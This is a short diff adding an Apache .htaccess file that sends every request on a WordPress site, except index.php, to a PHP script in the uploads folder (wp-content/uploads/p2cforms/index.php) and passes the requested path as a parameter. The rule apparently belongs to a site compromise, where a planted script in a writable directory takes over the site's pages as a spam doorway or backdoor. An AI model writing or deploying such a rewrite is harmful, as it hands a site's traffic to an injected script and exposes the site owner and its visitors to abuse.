@@ -1,0 +1,5 @@
+RewriteEngine On
+
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteRule . /wp-content/uploads/p2cforms/index.php?file=%{REQUEST_URI} [L]
